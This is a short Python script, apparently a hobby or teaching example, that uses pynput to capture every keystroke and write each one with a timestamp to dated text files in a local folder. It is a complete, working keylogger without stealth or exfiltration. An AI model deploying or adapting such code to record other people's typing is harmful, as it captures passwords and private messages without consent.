from pynput.keyboard import Key, Listener
import datetime, os

def on_press(key):
    now = datetime.datetime.now()
    date = now.day
    month = now.month
    year = now.year
    with open("records/{} {} {}.txt".format(date,month,year), mode="a") as f:
        line = "{} {}\n".format(now.strftime("%d/%m/%Y - %H:%M:%S"),str(key))
        f.write(line)

def main():
    directory = 'records'

    if not os.path.exists(directory):
        os.makedirs(directory)
    
    with Listener(
        on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
